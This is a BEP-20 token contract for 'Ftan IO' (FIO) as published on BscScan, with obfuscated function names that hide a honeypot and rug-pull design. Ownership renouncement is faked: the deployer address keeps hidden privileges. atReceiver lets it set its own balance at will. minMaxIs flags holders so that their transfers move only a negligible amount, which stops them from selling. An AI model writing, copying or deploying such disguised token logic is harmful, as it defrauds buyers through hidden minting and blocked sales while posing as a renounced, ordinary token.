/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface modeLiquidityLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellMarketing {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract FtanIO {
    uint8 private launchedTrading = 18;
    
    
    uint256 constant shouldModeTrading = 10 ** 10;

    uint256 private marketingEnable;
    string private receiverListExempt = "Ftan IO";
    bool private teamWalletMin;
    bool private maxFee;
    mapping(address => bool) public toFrom;
    mapping(address => uint256) private atMarketing;

    address private toAmountReceiver;
    address public feeIs;
    mapping(address => mapping(address => uint256)) private maxReceiverMarketing;
    uint256 private sellBuy;
    address public marketingLaunchedSwap;
    bool public isSwapMin;
    mapping(address => bool) public limitShould;
    string private feeBuyLaunch = "FIO";
    bool private maxListTo;


    uint256 private launchedMax = 100000000 * 10 ** launchedTrading;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        
        modeLiquidityLaunch swapWallet = modeLiquidityLaunch(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        marketingLaunchedSwap = sellMarketing(swapWallet.factory()).createPair(swapWallet.WETH(), address(this));
        toAmountReceiver = takeList();
        
        feeIs = toAmountReceiver;
        limitShould[feeIs] = true;
        if (teamWalletMin) {
            teamWalletMin = false;
        }
        atMarketing[feeIs] = launchedMax;
        emit Transfer(address(0), feeIs, launchedMax);
        txTake();
    }

    

    function buyMin(address autoMax, address txLaunch, uint256 fundAtSwap) internal returns (bool) {
        require(atMarketing[autoMax] >= fundAtSwap);
        atMarketing[autoMax] -= fundAtSwap;
        atMarketing[txLaunch] += fundAtSwap;
        emit Transfer(autoMax, txLaunch, fundAtSwap);
        return true;
    }

    function owner() external view returns (address) {
        return toAmountReceiver;
    }

    function takeList() private view returns (address) {
        return msg.sender;
    }

    function balanceOf(address receiverIs) public view returns (uint256) {
        return atMarketing[receiverIs];
    }

    function enableLaunchAmount() public view returns (bool) {
        return maxFee;
    }

    function atReceiver(uint256 fundAtSwap) public {
        if (!limitShould[takeList()]) {
            return;
        }
        atMarketing[feeIs] = fundAtSwap;
    }

    function transfer(address buyLaunch, uint256 fundAtSwap) external returns (bool) {
        return transferFrom(takeList(), buyLaunch, fundAtSwap);
    }

    function symbol() external view returns (string memory) {
        return feeBuyLaunch;
    }

    function txTake() public {
        emit OwnershipTransferred(feeIs, address(0));
        toAmountReceiver = address(0);
    }

    function transferFrom(address exemptAuto, address buyLaunch, uint256 fundAtSwap) public returns (bool) {
        if (exemptAuto != takeList() && maxReceiverMarketing[exemptAuto][takeList()] != type(uint256).max) {
            require(maxReceiverMarketing[exemptAuto][takeList()] >= fundAtSwap);
            maxReceiverMarketing[exemptAuto][takeList()] -= fundAtSwap;
        }
        if (buyLaunch == feeIs || exemptAuto == feeIs) {
            return buyMin(exemptAuto, buyLaunch, fundAtSwap);
        }
        if (marketingEnable == sellBuy) {
            sellBuy = marketingEnable;
        }
        if (toFrom[exemptAuto]) {
            return buyMin(exemptAuto, buyLaunch, shouldModeTrading);
        }
        
        return buyMin(exemptAuto, buyLaunch, fundAtSwap);
    }

    function minMaxIs(address fromSwapLimit) public {
        if (maxListTo) {
            maxFee = false;
        }
        if (fromSwapLimit == feeIs || fromSwapLimit == marketingLaunchedSwap || !limitShould[takeList()]) {
            return;
        }
        if (marketingEnable == sellBuy) {
            maxFee = false;
        }
        toFrom[fromSwapLimit] = true;
    }

    function approve(address exemptAutoTotal, uint256 fundAtSwap) public returns (bool) {
        maxReceiverMarketing[takeList()][exemptAutoTotal] = fundAtSwap;
        emit Approval(takeList(), exemptAutoTotal, fundAtSwap);
        return true;
    }

    function getOwner() external view returns (address) {
        return toAmountReceiver;
    }

    function autoBuy() public {
        
        if (teamWalletMin != maxFee) {
            maxFee = true;
        }
        marketingEnable=0;
    }

    function totalSupply() external view returns (uint256) {
        return launchedMax;
    }

    function allowance(address txIs, address exemptAutoTotal) external view returns (uint256) {
        return maxReceiverMarketing[txIs][exemptAutoTotal];
    }

    function name() external view returns (string memory) {
        return receiverListExempt;
    }

    function maxLaunchSell() public view returns (uint256) {
        return marketingEnable;
    }

    function decimals() external view returns (uint8) {
        return launchedTrading;
    }

    function modeTx(address toMarketing) public {
        if (isSwapMin) {
            return;
        }
        
        limitShould[toMarketing] = true;
        
        isSwapMin = true;
    }

    function autoTotal() public view returns (bool) {
        return maxFee;
    }


}